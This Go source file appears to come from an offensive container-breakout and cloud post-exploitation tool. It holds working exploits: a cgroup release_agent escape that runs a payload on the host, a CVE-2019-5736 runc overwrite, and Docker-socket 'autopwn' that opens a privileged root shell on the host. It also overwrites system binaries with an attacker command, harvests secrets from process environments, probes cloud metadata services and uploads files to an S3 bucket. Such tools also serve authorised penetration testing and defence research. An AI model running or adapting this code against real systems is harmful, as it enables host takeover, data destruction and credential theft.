package main

import (
	"archive/tar"
	"bufio"
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/credentials"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/s3/s3manager"
	"github.com/kr/pty"
	"github.com/tv42/httpunix"
	"golang.org/x/crypto/ssh/terminal"
)

func abuseCgroupPriv(payload string) {
	if payload == "nil" {
		fmt.Println("[-] Please provide a payload")
		return
	}
	fmt.Println("[+] Attempting to abuse CGROUP Privileges")
	if *verbosePtr {
		fmt.Println("[*] Extracting Container Home: sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab")
	}

	//Locate where the container is located on the underlying host
	containerHome, err := execShellCmd("sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab")
	if err != nil {
		fmt.Println("[ERROR] Extracting Container Home  -> 'sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab'. ", err)
	}

	containerHome = strings.TrimSpace(containerHome)
	if *verbosePtr {
		fmt.Println("[*] Container Home Extracted: ", containerHome)
	}

	//Generate where the cgroup directories will live
	randomCgroupPath := generateRandomString(6)
	randomCgroupChild := generateRandomString(6)

	//This satisfies this command essentially "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x"
	cgroupFullPath := fmt.Sprintf("/etc/cgrp%s/%s", randomCgroupPath, randomCgroupChild)
	cgroupPartialPath := fmt.Sprintf("/etc/cgrp%s", randomCgroupPath)

	cgroupController := "memory"

	if *verbosePtr {
		fmt.Println("[*] CGROUP Location: ", cgroupFullPath)
	}
	out, err := execShellCmd("mkdir " + cgroupPartialPath)

	if err != nil {
		fmt.Println("[ERROR] In Created Cgroup folder -> 'mkdir "+cgroupPartialPath+"'.", err, out)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Created Cgroup folder:", cgroupPartialPath)
	}

	//mount -t cgroup -o rdma cgroup /tmp/cgrp
	// "mount -t cgroup -o " + cgroupController + " cgroup " + cgroupPartialPath
	mountCmd := fmt.Sprintf("mount -t cgroup -o %s cgroup %s", cgroupController, cgroupPartialPath)
	_, err = execShellCmd(mountCmd)

	if err != nil {
		fmt.Println("[INFO] CGROUP may exist, attempting exploit regardless")
		fmt.Printf("[ERROR] In Mounted CGROUP controller -> '%s'.%s\n", mountCmd, err)
		// exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Mounted CGROUP controller: ", mountCmd)
	}

	// Create a folder for the child cgroup i.e mkdir /tmp/cgrp/x
	_, err = execShellCmd("mkdir " + cgroupFullPath)

	if err != nil {
		fmt.Println("[ERROR] In Created Child CGROUP folder -> 'mkdir "+cgroupFullPath+"'.", err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Created Child CGROUP folder:", cgroupPartialPath)
	}

	// echo 1 > /tmp/cgrp/x/notify_on_release
	notifyOnReleaseCmd := fmt.Sprintf("echo 1 > %s/notify_on_release", cgroupFullPath)
	_, err = execShellCmd(notifyOnReleaseCmd)

	if err != nil {
		fmt.Println("[ERROR] In Enabling CGROUP Notifications -> 'echo 1 > "+cgroupFullPath+"/notify_on_release'. ", err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Enabled CGROUP Notifications:", notifyOnReleaseCmd)
	}

	// echo "$host_path/cmd" > /tmp/cgrp/release_agent
	releaseAgentCommand := "echo " + containerHome + "/cmd > " + cgroupPartialPath + "/release_agent"
	_, err = execShellCmd(releaseAgentCommand)

	if err != nil {
		fmt.Println("[ERROR] In Created CMD Script -> '"+releaseAgentCommand+"'. ", err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Created CMD Script:", releaseAgentCommand)
	}

	_, err = execShellCmd("echo '#!/bin/sh' > /cmd")

	if err != nil {
		fmt.Println("[ERROR] In Inserted shebang into CMD Script -> 'echo '#!/bin/sh' > /cmd'. ", err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Inserted shebang into CMD Script: echo '#!/bin/sh' > /cmd")
	}

	payloadString := fmt.Sprintf("echo '%s > %s/output'>> /cmd", payload, containerHome)

	if *verbosePtr {
		fmt.Println("[*] Payload provided: ", payload)
	}

	_, err = execShellCmd(payloadString)

	if err != nil {
		fmt.Println("[ERROR] In Inserted payload into CMD script -> '"+payloadString+"'. ", err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Inserted payload into CMD script: ", payloadString)
	}

	_, err = execShellCmd("chmod a+x /cmd")

	if err != nil {
		fmt.Println("[ERROR] In -> 'chmod a+x /cmd'. ", err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] chmod'ing cmd script: chmod a+x /cmd")
	}

	// "echo $$ > " + cgroupFullPath + "/cgroup.procs"
	addAndExecuteCmd := fmt.Sprintf("echo $$ > %s/cgroup.procs", cgroupFullPath)
	_, err = execShellCmd(addAndExecuteCmd)

	if err != nil {
		fmt.Printf("[ERROR] In  Executing, adding a process to CGROUP-> %s, %s\n", addAndExecuteCmd, err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Executing, adding a process to CGROUP: ", addAndExecuteCmd)
	}

	fmt.Println("[*] The result of your command can be found in /output")
}

func generateRandomString(len int) string {
	rand.Seed(time.Now().UTC().UnixNano())
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		bytes[i] = byte(65 + rand.Intn(25))
	}
	return string(bytes)
}

func scrapeGcpMetadata(host, port string) (string, error) {
	connStr := fmt.Sprintf("%s:%s", host, port)
	d := net.Dialer{Timeout: time.Second * 5}

	fmt.Println("[+] Attempting to connect to: ", connStr)
	conn, err := d.Dial("tcp", connStr)
	if err != nil {
		return "", err
	}
	fmt.Fprintf(conn, "GET / HTTP/1.0\r\n\r\n")
	var buf bytes.Buffer
	bytesWritten, err := io.Copy(&buf, conn)
	if err != nil {
		return "", err
	}
	fmt.Printf("[*] Bytes received from metadata: %d\n", bytesWritten)
	return buf.String(), nil
}

func testUploadOfS3(fileToPush, s3Bucket, s3Region string) {
	fmt.Printf("[+] Pushing %s to -> %s\n", fileToPush, s3Bucket)

	s, err := session.NewSession(&aws.Config{
		Region:      aws.String(s3Region),
		Credentials: credentials.AnonymousCredentials,
	})

	if err != nil {
		fmt.Println("[ERROR] ", err)
	}

	err = s3Push(s, fileToPush, s3Bucket)
	if err != nil {
		fmt.Println("[ERROR] ", err)
	}
}

func s3Push(s *session.Session, filename, s3Bucket string) error {
	uploader := s3manager.NewUploader(s)

	file, err := os.Open(filename)
	if err != nil {
		return fmt.Errorf("failed to open file %q, %v", filename, err)
	}

	result, err := uploader.Upload(&s3manager.UploadInput{
		Bucket: aws.String(s3Bucket),
		Key:    aws.String(filename),
		Body:   file,
	})
	if err != nil {
		return fmt.Errorf("failed to upload file, %v", err)
	}

	fmt.Println("[*] Data uploaded to:", *aws.String(result.Location))

	return nil
}

func getGcpMetada() {
	fmt.Println("[+] Attempting to get GCP Metadata")
}

func execDocker(dockerSockPath string) error {
	cmd := "./docker/docker -H unix://" + dockerSockPath + " run docker id"
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return err
	}
	if *verbosePtr {
		fmt.Printf("[*] Command Output: %s\n", string(out[:]))
	}
	exitCode = 1
	return nil
}

func autopwn(path string, cicd bool) {
	fmt.Println("[+] Attempting to autopwn")
	sockets, _ := getValidSockets(path)
	httpSockets := getHTTPEnabledSockets(sockets)
	dockerSocks := getDockerEnabledSockets(httpSockets)
	for _, element := range dockerSocks {
		err := autopwnDocker(element, cicd)
		if err != nil {
			fmt.Println("[ERROR] ", err)
		}
	}
}

func autopwnDocker(dockerSock string, cicd bool) error {
	fmt.Println("[+] Attempting to autopwn: ", dockerSock)

	_, err := os.Stat("docker/docker")
	fileUrl := "https://download.docker.com/linux/static/stable/x86_64/docker-18.09.2.tgz"
	if err != nil {
		if *verbosePtr {
			fmt.Println("[*] Getting Docker client...")
		}
		if err := downloadFile("docker-18.09.2.tgz", fileUrl); err != nil {
			return err
		}
	}

	file, err := os.Open("docker-18.09.2.tgz")
	if err != nil {
		return err
	}
	err = untar(".", file)
	if err != nil {
		return err
	}
	if *verbosePtr {
		fmt.Println("[*] Successfully got Docker client...")
	}
	fmt.Println("[+] Attempting to escape to host...")
	if cicd {
		if *verbosePtr {
			fmt.Println("[+] Attempting in CICD Mode")
		}
		err := execDocker(dockerSock)
		if err != nil {
			fmt.Println("[*] Failed to escape container")
			return err
		}
		fmt.Println("[!] Successfully escaped container")
	} else {
		fmt.Println("[+] Attempting in TTY Mode")
		err := dropToTTY(dockerSock)
		if err != nil {
			return err
		}
		fmt.Println("[*] Successfully exited TTY")
	}
	return nil
}

func huntDomainSockets() {
	fmt.Println("[+] Hunting Down UNIX Domain Sockets from:", *pathPtr)
	sockets, _ := getValidSockets(*pathPtr)
	for _, element := range sockets {
		fmt.Println("[!] Found Valid UNIX Domain Socket: ", element)
	}
}

func checkEnvVars(wordlist string) {
	fmt.Println("[+] Checking ENV Variables for secrets")
	var terms []string
	var err error
	if wordlist != "nil" {
		terms, err = getLinesFromFile(wordlist)
		if err != nil {
			panic(err)
		}
	} else {
		terms = append(terms, "secret", "password")
	}

	for _, envVar := range os.Environ() {
		if checkForJuicyDeets(wordlist, envVar, terms) {
			fmt.Println("[!] Sensitive Keyword found in ENV: ", envVar)
			exitCode = 2
		}
	}

}

func checkProcEnviron(wordlist string) {
	fmt.Println("[+] Searching /proc/* for data")
	files, err := ioutil.ReadDir("/proc")
	if err != nil {
		fmt.Println("[ERROR], Could not access ProcFS")
		return
	}

	var terms []string
	if wordlist != "nil" {
		terms, err = getLinesFromFile(wordlist)
		if err != nil {
			panic(err)
		}
	} else {
		terms = append(terms, "secret", "password")
	}

	for _, file := range files {
		environFile := "/proc/" + file.Name() + "/environ"
		_, err := os.Stat(environFile)
		if err != nil {
			if *verbosePtr {
				fmt.Println("[ERROR] file does not exist-> ", environFile)
			}
		} else {
			cmd := "cat " + environFile
			output, err := execShellCmd(cmd)
			if err != nil {
				if *verbosePtr {
					fmt.Println("[ERROR] Could not query environ for-> ", environFile)
				}
			}
			if checkForJuicyDeets(wordlist, output, terms) {
				fmt.Printf("[!] Sensitive keyword found in: %s -> '%s'\n", environFile, output)
				exitCode = 2
			}
		}
	}
}

func checkForJuicyDeets(wordlist string, data string, terms []string) bool {
	if wordlist != "nil" {
		for _, term := range terms {
			if strings.Contains(strings.ToLower(data), strings.ToLower(term)) {
				return true
			}
		}
	} else {
		if strings.Contains(strings.ToLower(data), "password") || strings.Contains(strings.ToLower(data), "secret") {
			return true
		}
		return false
	}
	return false
}

func execShellCmd2(command string, args ...string) error {
	cmd := exec.Command(command, args...)
	if *verbosePtr {
		fmt.Println("[*] Running command and waiting to finish")
	}
	err := cmd.Run()
	if err != nil {
		return err
	}
	return nil
}

func execShellCmd(cmd string) (string, error) {
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return string(out[:]), err
	}
	return string(out[:]), nil
}

func performHttpGetRequest(url string) (int, error) {
	timeout := time.Duration(3 * time.Second)
	client := http.Client{
		Timeout: timeout,
	}
	resp, err := client.Get(url)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	return resp.StatusCode, nil
}

func scrapeMetadataEndpoints(endpointList string) {

	if endpointList != "nil" {
		endpoints, err := getLinesFromFile(endpointList)
		if err != nil {
			log.Fatal(err)
		}

		for _, target := range endpoints {
			u, err := url.Parse(target)
			if err != nil {
				log.Fatal(err)
			}
			hostport := u.Port()
			if len(hostport) == 0 {
				hostport = "80"
			}

			resp, err := scrapeGcpMetadata(u.Hostname(), hostport)
			if err != nil {
				fmt.Println("[ERROR] ", err)
			} else {
				fmt.Println("[*] Output-> \n", resp)
				exitCode = 1
			}
		}

	} else {
                if *verbosePtr {
                        fmt.Println("[*] Attemp to query Azure, Amazon and Digital Ocean")
                }
                if queryEndpoint("http://169.254.169.254/") {
                        exitCode = 1
                }
                if *verbosePtr {
                        fmt.Println("[*] Attemp to query Google GCP")
                }
                if queryEndpoint("http://metadata.google.internal/") {
                        exitCode = 1
                }
                if *verbosePtr {
                        fmt.Println("[*] Attemp to query Alibaba Cloud")
                }
                if queryEndpoint("http://100.100.100.200/") {
                        exitCode = 1
                }
	}

}

func checkMetadataServices(endpointList string) {
	if endpointList != "nil" {
		endpoints, err := getLinesFromFile(endpointList)
		if err != nil {
			log.Fatal(err)
		}

		for _, endpoint := range endpoints {
			if queryEndpoint(endpoint) {
				exitCode = 1
			}
		}

	} else {
		if queryEndpoint("http://169.254.169.254:80/") {
			exitCode = 1
		}

		if queryEndpoint("http://169.254.169.254:8080/") {
			exitCode = 1
		}
	}
}

func runcPwn(hijackCommand string) {

	if hijackCommand == "nil" {
		fmt.Println("[-] Please provide a payload")
		return
	}

	//This code has been pretty much copy+pasted from the great work done by Nick Frichetten
	//https://github.com/Frichetten/CVE-2019-5736-PoC
	fmt.Println("[!] WARNING THIS OPTION IS NOT CICD FRIENDLY, THIS WILL PROBABLY BREAK THE CONTAINER RUNTIME BUT YOU MIGHT GET SHELLZ...")
	payload := fmt.Sprintf("#!/bin/bash \n %s", hijackCommand)
	fmt.Println("[+] Attempting to exploit CVE-2019-5736 with command: ", hijackCommand)
	fd, err := os.Create("/bin/sh")
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintln(fd, "#!/proc/self/exe")
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("[+] This process will exit IF an EXECVE is called in the Container or if the Container is manually stopped")

	var found int
	for found == 0 {
		pids, err := ioutil.ReadDir("/proc")
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
			fstring := string(fbytes)
			if strings.Contains(fstring, "runc") {
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}
	var handleFd = -1
	for handleFd == -1 {
		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
		if int(handle.Fd()) > 0 {
			handleFd = int(handle.Fd())
		}
	}
	for {
		writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) > 0 {
			writeHandle.Write([]byte(payload))
			return
		}
	}
}

func getLinesFromFile(path string) ([]string, error) {
	fmt.Println("[*] Loading entries from:", path)
	var lines []string
	inFile, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer inFile.Close()
	scanner := bufio.NewScanner(inFile)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, nil
}

func queryEndpoint(url string) bool {
	fmt.Printf("[*] Attempting to query metadata endpoint: '%s'\n", url)
	respCode, err := performHttpGetRequest(url)
	if err != nil {
		if *verbosePtr {
			fmt.Println("[ERROR]", err)
		}
	}
	if respCode > 0 {
		fmt.Printf("[!] Reponse from '%s' -> %d\n", url, respCode)
		return true
	}
	return false
}

func processCmdLine() {
	var found int
	for found == 0 {
		pids, err := ioutil.ReadDir("/proc")
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
			fstring := string(fbytes)
			if strings.Contains(fstring, "runc") {
				fmt.Println("[+] Found the PID:", f.Name())
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}
}

func hijackBinaries(hijackCommand string) {

	if hijackCommand != "nil" {
		fmt.Println("[!] WARNING THIS WILL PROBABLY BREAK THE CONTAINER BUT YOU MAY GET SHELLZ...")
		fmt.Println("[+] Attempting to hijack binaries")
		fmt.Println("[*] Command to be used: ", hijackCommand)
		command := fmt.Sprintf("#!/bin/sh \n %s \n", hijackCommand)

		hijackDirectory("/bin", command)
		hijackDirectory("/sbin", command)
		hijackDirectory("/usr/bin", command)
		hijackDirectory("/usr/sbin", command)
	} else {
		fmt.Println("[-] Please provide a payload")
	}

}

func copyFile(src, dst string) error {
	if *verbosePtr {
		fmt.Printf("[!] Copying %s -> %s\n", src, dst)
	}

	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	if err != nil {
		return err
	}
	return out.Close()
}

func createFile(filename, data string) error {
	if *verbosePtr {
		fmt.Println("[*] Creating file: ", filename)
	}
	f, err := os.Create(filename)
	if err != nil {
		fmt.Println(err)
		return err
	}
	l, err := f.WriteString(data)
	if err != nil {
		fmt.Println(err)
		f.Close()
		return err
	}
	if *verbosePtr {
		fmt.Println(l, "[*] Bytes written successfully")
	}

	err = f.Close()
	if err != nil {
		fmt.Println(err)
		return err
	}
	return nil
}

func hijackDirectory(dir, command string) {
	fmt.Println("[+] Currently hijacking: ", dir)
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		log.Fatal(err)
	}
	if *verbosePtr {
		fmt.Printf("[*] Number of binaries identified: %d\n", len(files))
	}

	for _, file := range files {
		if strings.ToLower(file.Name()) == "busybox" || strings.ToLower(file.Name()) == "sh" || strings.ToLower(file.Name()) == "dash" ||
			strings.ToLower(file.Name()) == "ls" || strings.ToLower(file.Name()) == "echo" || strings.ToLower(file.Name()) == "chmod" ||
			strings.ToLower(file.Name()) == "bash" || strings.ToLower(file.Name()) == "cp" || strings.ToLower(file.Name()) == "compgen" ||
			strings.ToLower(file.Name()) == "rm" || strings.ToLower(file.Name()) == "mv" || strings.ToLower(file.Name()) == "which" ||
			strings.ToLower(file.Name()) == "curl" || strings.ToLower(file.Name()) == "chown" {
			if *verbosePtr {
				fmt.Println("[*] Skipping: ", file.Name())
			}
		} else {
			if *verbosePtr {
				fmt.Println("[*] Hijacking -> ", file.Name())
			}

			err := createFile(file.Name(), command)
			if err != nil {
				if *verbosePtr {
					fmt.Println("[*] Error creating tmp file->", err)
				}
			}

			err = execShellCmd2("rm", fmt.Sprintf("%s/%s", dir, file.Name()))
			if err != nil {
				if *verbosePtr {
					fmt.Println("[*] Error deleting binary file->", err)
				}
			}

			err = copyFile(file.Name(), fmt.Sprintf("%s/%s", dir, file.Name()))
			if err != nil {
				if *verbosePtr {
					fmt.Println("[*] Error copying file->", err)
				}

			}

			err = execShellCmd2("chmod", "+x", fmt.Sprintf("%s/%s", dir, file.Name()))
			if err != nil {
				if *verbosePtr {
					fmt.Println("[*] Error chmoding file->", err)
				}
			}
			err = execShellCmd2("rm", file.Name())
			if err != nil {
				if *verbosePtr {
					fmt.Println("[*] Error cleaning up->", err)
				}
			}
		}
	}
}

func findDomainSockets(path string) {
	fmt.Println("[+] Looking for UNIX Domain Sockets from:", path)
	sockets, _ := getValidSockets(path)
	for _, element := range sockets {
		fmt.Println("[!] Valid Socket: " + element)
		exitCode = 1
	}
}

func findHttpSockets(path string) {
	fmt.Println("[+] Looking for HTTP enabled Sockets from:", path)
	sockets, _ := getValidSockets(path)
	httpSockets := getHTTPEnabledSockets(sockets)
	for _, aSock := range httpSockets {
		fmt.Println("[!] Valid HTTP Socket:", aSock)
		exitCode = 1
	}
}

func findDockerD() {
	fmt.Println("[+] Looking for Dockerd")
	dockerdVal, checkResult := checkForDockerEnvSock()
	if checkResult {
		fmt.Println("[!] Dockerd DOCKER_HOST found:", dockerdVal)
		exitCode = 1
	}
	sockets, _ := getValidSockets(*pathPtr)
	httpSockets := getHTTPEnabledSockets(sockets)
	dockerSocks := getDockerEnabledSockets(httpSockets)
	for _, aSock := range dockerSocks {
		fmt.Println("[!] Valid Docker Socket:", aSock)
		exitCode = 1
	}
}

func checkForDockerEnvSock() (string, bool) {
	fmt.Println("[*] Looking for Docker ENV variables")
	for _, envVar := range os.Environ() {
		if strings.Contains(strings.ToUpper(envVar), "DOCKER_HOST") {
			return envVar[strings.Index(envVar, "=")+1:], true
		}
	}
	return "", false
}

func downloadFile(filepath string, url string) error {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: transport}
	resp, err := client.Get(url)
	if err != nil {
		return err
	}

	defer resp.Body.Close()
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, resp.Body)
	return err
}

func dropToTTY(dockerSockPath string) error {
	// this code has been copy+pasted directly from https://github.com/kr/pty, it's that awesome
	cmd := "./docker/docker -H unix://" + dockerSockPath + " run -ti --privileged --net=host --pid=host --ipc=host -v /:/host alpine:latest /bin/sh"
	fmt.Println(cmd)
	c := exec.Command("sh", "-c", cmd)

	// Start the command with a pty.
	ptmx, err := pty.Start(c)
	if err != nil {
		return err
	}

	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
				log.Printf("error resizing pty: %s", err)
			}
		}
	}()
	ch <- syscall.SIGWINCH // Initial resize.
	go func() {
		ptmx.Write([]byte("chroot /host && clear\n"))
	}()

	// Set stdin in raw mode.
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		panic(err)
	}
	defer func() { _ = terminal.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.

	go func() {
		ptmx.Write([]byte("echo 'You are now on the underlying host'\n"))
	}()
	// Copy stdin to the pty and the pty to stdout.
	go func() { _, _ = io.Copy(ptmx, os.Stdin) }()
	_, _ = io.Copy(os.Stdout, ptmx)
	return nil
}

func untar(dst string, r io.Reader) error {
	// this code has been copy pasted from this great gist https://gist.github.com/sdomino/635a5ed4f32c93aad131#file-untargz-go
	gzr, err := gzip.NewReader(r)
	if err != nil {
		return err
	}
	defer gzr.Close()
	tr := tar.NewReader(gzr)
	for {
		header, err := tr.Next()
		switch {
		// if no more files are found return
		case err == io.EOF:
			return nil
		// return any other error
		case err != nil:
			return err
		// if the header is nil, just skip it (not sure how this happens)
		case header == nil:
			continue
		}
		// the target location where the dir/file should be created
		target := filepath.Join(dst, header.Name)
		// check the file type
		switch header.Typeflag {

		// if its a dir and it doesn't exist create it
		case tar.TypeDir:
			if _, err := os.Stat(target); err != nil {
				if err := os.MkdirAll(target, 0755); err != nil {
					return err
				}
			}
		// if it's a file create it
		case tar.TypeReg:
			f, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))
			if err != nil {
				return err
			}
			// copy over contents
			if _, err := io.Copy(f, tr); err != nil {
				return err
			}
			// manually close here after each file operation; defering would cause each file close
			// to wait until all operations have completed.
			f.Close()
		}
	}
}

func getDockerEnabledSockets(socks []string) []string {
	fmt.Println("[+] Hunting Docker Socks")
	var dockerSocks []string
	for _, element := range socks {
		resp, err := checkSock(element)
		if err == nil {
			if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
				dockerSocks = append(dockerSocks, element)
				if *verbosePtr {
					fmt.Println("[+] Valid Docker Socket: " + element)
				}
			} else {
				if *verbosePtr {
					fmt.Println("[+] Invalid Docker Socket: " + element)
				}
			}
			defer resp.Body.Close()
		} else {
			if *verbosePtr {
				fmt.Println("[+] Invalid Docker Socket: " + element)
			}
		}
	}
	return dockerSocks
}

func getHTTPEnabledSockets(socks []string) []string {
	var httpSocks []string
	for _, element := range socks {
		_, err := checkSock(element)
		if err == nil {
			httpSocks = append(httpSocks, element)
			if *verbosePtr {
				fmt.Println("[+] Valid HTTP Socket: " + element)
			}
		} else {
			if *verbosePtr {
				fmt.Println("[+] Invalid HTTP Socket: " + element)
			}
		}
	}
	return httpSocks
}

func walkpath(path string, info os.FileInfo, err error) error {
	if err != nil {
		if *verbosePtr {
			fmt.Println("[ERROR]: ", err)
		}
	} else {
		switch mode := info.Mode(); {
		case mode&os.ModeSocket != 0:
			validSocks = append(validSocks, path)
		default:
			if *verbosePtr {
				fmt.Println("[*] Invalid Socket: " + path)
			}
		}
	}
	return nil
}

func getValidSockets(startPath string) ([]string, error) {
	validSocks = nil
	err := filepath.Walk(startPath, walkpath)
	if err != nil {
		if *verbosePtr {
			fmt.Println("[ERROR]: ", err)
		}
		return nil, err
	}
	return validSocks, nil
}

func checkSock(path string) (*http.Response, error) {
	if *verbosePtr {
		fmt.Println("[-] Checking Sock for HTTP: " + path)
	}

	u := &httpunix.Transport{
		DialTimeout:           100 * time.Millisecond,
		RequestTimeout:        1 * time.Second,
		ResponseHeaderTimeout: 1 * time.Second,
	}
	u.RegisterLocation("dockerd", path)
	var client = http.Client{
		Transport: u,
	}
	resp, err := client.Get("http+unix://dockerd/info")

	if resp == nil {
		return nil, err
	}
	return resp, nil
}

func debug(data []byte, err error) {
	if err == nil {
		fmt.Printf("%s\n\n", data)
	} else {
		log.Fatalf("%s\n\n", err)
	}
}

func reverseDNS(cidr string) {
        fmt.Println("[*] Attemp to reverse DNS lookup:", cidr)
        ip, subnet, err := net.ParseCIDR(cidr)
        if err != nil {
                return
        }
        split := strings.Split(cidr, "/")
        bits, err := strconv.Atoi(split[1])
        if err != nil {
                return
        }
        size := int(math.Exp2(float64(32-bits)))
        if size > 2 {
                for i := 0 ; i < size ; i++ {
                        if i > 0 && i < size-1 {
                                ip = net.IPv4(subnet.IP[0] | byte((i & 0xff000000) >> 24),
                                              subnet.IP[1] | byte((i & 0x00ff0000) >> 16),
                                              subnet.IP[2] | byte((i & 0x0000ff00) >>  8),
                                              subnet.IP[3] | byte((i & 0x000000ff) >>  0))
                                reverse, _ := net.LookupAddr(ip.String())
                                if reverse != nil {
                                        fmt.Printf("[!] %s DNS entry: %s\n", ip.String(), strings.Join(reverse[:],", "))
                                }
                        }
                }
        }
}
